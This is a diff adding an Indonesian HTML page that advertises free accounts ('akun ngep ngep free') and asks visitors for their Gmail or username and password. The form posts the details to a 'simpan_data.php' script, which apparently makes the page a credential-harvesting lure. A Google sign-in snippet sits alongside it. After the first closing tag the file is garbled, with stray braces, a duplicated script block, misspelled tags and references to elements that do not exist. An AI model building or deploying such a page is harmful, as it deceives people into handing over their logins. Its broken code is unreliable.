@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>EPEP FREE</title>
+  <style>
+    body {
+      background-image: url('https://files.catbox.moe/2y3jm6.jpg');
+      background-size: cover;
+      background-position: center;
+    }
+    .login-container {
+      width: 3000px;
+      margin: 500px auto;
+      background-color: #fff;
+      padding: 10px;
+      border: 10px solid #ddd;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    }
+    .login-form {
+      width: 100%;
+      padding: 10px;
+    }
+    .login-form h2 {
+      text-align: center;
+      margin-bottom: 10px;
+    }
+    .input-group {
+      margin-bottom: 10px;
+    }
+    .input-group label {
+      display: block;
+      margin-bottom: 10px;
+    }
+    .input-group input {
+      width: 100%;
+      height: 40px;
+      padding: 1px;
+      border: 1px solid #ccc;
+    }
+    button[type="submit"] {
+      width: 100%;
+      height: 40px;
+      background-color: #4CAF50;
+      color: #fff;
+      padding: 10px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    button[type="submit"]:hover {
+      background-color: #3e8e41;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <div class="login-form">
+      <h1>akun ngep ngep free</h1>
+      <form action="simpan_data.php" method="post">
+        <div class="input-group">
+          <label for="username">usr/gmail</label>
+          <input type="text" id="username" name="username" required>
+        </div>
+        <div class="input-group">
+          <label for="password">pw/pasword</label>
+          <input type="password" id="password" name="password" required>
+        </div>
+        <button type="submit">SUK</button>
+        <button type="sumbit">unregister</button>
+      </form>
+    </div>
+    <h1>SILAKAN LOGIN TERLEBIH DAHULU AGAR BISA MENG AKSES AKUN</h1>
+  </div>
+  <h2>SEBELUM RAMADAN GW PEN BAGI² AKUN</h2>
+  <div id="login-button">
+    <div class="g-signin2" data-onsuccess="onSignIn"></div>
+  </div>
+  <script src="https://apis.google.com/js/platform.js" async defer></script>
+  <meta name="google-signin-client_id" content="1047578655779-7g9ooic7u5tk0btadfvsvsn2aaq9tgqr.apps.googleusercontent.com">
+  <meta name="google-signin-scope" content="profile email">
+  <script>
+    function onSignIn(googleUser) {
+      var profile = googleUser.getBasicProfile();
+      console.log('ID: ' + profile.getId());
+      console.log('Name: ' + profile.getName());
+      console.log('Image URL: ' + profile.getImageUrl());
+      console.log('Email: ' + profile.getEmail());
+      // Verifikasi email
+      if (profile.getEmail() === 'email yang Anda inginkan') {
+        // Login berhasil, arahkan ke halaman berikutnya
+        window.location.href = 'menu.html';
+      } else {
+        // Login gagal
+        alert('Email tidak valid!');
+      }
+    }
+  </script>
+</body>
+</html> }
+    }
+    
+    function playSound() {
+      document.getElementById('login-sound').play();
+    }
+  </script>
+</body>
+</html>
+<html>
+<heand>
+<script>
+  function onSignIn(googleUser) {
+    var profile = googleUser.getBasicProfile();
+    console.log('ID: ' + profile.getId());
+    console.log('Name: ' + profile.getName());
+    console.log('Image URL: ' + profile.getImageUrl());
+    console.log('Email: ' + profile.getEmail());
+    // Verifikasi email
+    if (profile.getEmail() === 'email yang Anda inginkan') {
+      // Login berhasil, arahkan ke halaman berikutnya
+      window.location.href = 'menu.html';
+    } else {
+      // Login gagal
+      alert('Email tidak valid!');
+    }
+  }
+  
+  // Tambahkan event listener untuk tombol "SUK"
+  document.getElementById('login-form').addEventListener('submit', function(event) {
+    event.preventDefault();
+    var username = document.getElementById('username').value;
+    var password = document.getElementById('password').value;
+    // Verifikasi username dan password
+    if (username === 'username yang Anda inginkan' && password === 'password yang Anda inginkan') {
+      // Login berhasil, arahkan ke halaman berikutnya
+      window.location.href = 'menu.html';
+    } else {
+      // Login gagal
+      alert('Username atau password salah!');
+    }
+  });
+</script>
+</heand>
+</html>
